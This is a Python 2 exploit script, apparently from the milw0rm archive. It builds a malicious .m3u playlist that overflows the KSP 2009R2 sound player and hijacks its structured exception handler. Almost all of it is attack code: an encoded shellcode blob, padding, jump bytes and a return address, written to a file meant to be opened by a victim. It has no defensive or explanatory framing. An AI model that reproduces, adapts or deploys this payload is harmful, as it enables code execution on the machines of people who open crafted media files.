##!/usr/bin/python
# Found By :: HACK4LOVE
# hack4love@hotmail.com
# KSP 2009R2 (m3u) Universal Local Buffer Exploit (SEH)
# http://ksplayer.boo.pl/index.php
# #--->> info:: KSP 2009R2 Sound Player was released 28//8//2009
# AND special THANKS FOR His0k4#
######################################################################
shellcode=(
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"
"\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x34\x4e\x43\x4b\x58\x4e\x47"
"\x45\x50\x4a\x37\x41\x50\x4f\x4e\x4b\x58\x4f\x34\x4a\x41\x4b\x58"
"\x4f\x55\x42\x52\x41\x50\x4b\x4e\x49\x44\x4b\x38\x46\x33\x4b\x48"
"\x41\x50\x50\x4e\x41\x43\x42\x4c\x49\x59\x4e\x4a\x46\x58\x42\x4c"
"\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x33\x46\x55\x46\x52\x46\x50\x45\x47\x45\x4e\x4b\x48"
"\x4f\x55\x46\x52\x41\x30\x4b\x4e\x48\x56\x4b\x48\x4e\x30\x4b\x34"
"\x4b\x48\x4f\x35\x4e\x51\x41\x50\x4b\x4e\x4b\x58\x4e\x51\x4b\x58"
"\x41\x50\x4b\x4e\x49\x48\x4e\x55\x46\x42\x46\x50\x43\x4c\x41\x43"
"\x42\x4c\x46\x36\x4b\x38\x42\x54\x42\x33\x45\x38\x42\x4c\x4a\x47"
"\x4e\x30\x4b\x48\x42\x34\x4e\x50\x4b\x58\x42\x57\x4e\x51\x4d\x4a"
"\x4b\x48\x4a\x36\x4a\x50\x4b\x4e\x49\x50\x4b\x48\x42\x38\x42\x4b"
"\x42\x30\x42\x50\x42\x30\x4b\x58\x4a\x56\x4e\x43\x4f\x35\x41\x33"
"\x48\x4f\x42\x46\x48\x55\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x57"
"\x42\x45\x4a\x46\x42\x4f\x4c\x58\x46\x30\x4f\x35\x4a\x46\x4a\x59"
"\x50\x4f\x4c\x58\x50\x50\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x56"
"\x4e\x36\x43\x56\x42\x30\x5a")
#########################################################################
buffer = shellcode
buffer += "\x41"*(2869-len(shellcode))
buffer += "\xE8\xC6\xF4\xFF\xFF"
buffer += "\x90"*10
buffer += "\xEB\xEF\x90\x90"
buffer += "\x88\x57\x40"

print buffer
#########################################################################
try:
out_file = open("hack4love.m3u",'w')
out_file.write(buffer)
out_file.close()
raw_input("\nExploit file created!\n")
except:
print "Error"
########################################################################

# milw0rm.com [2009-09-10]
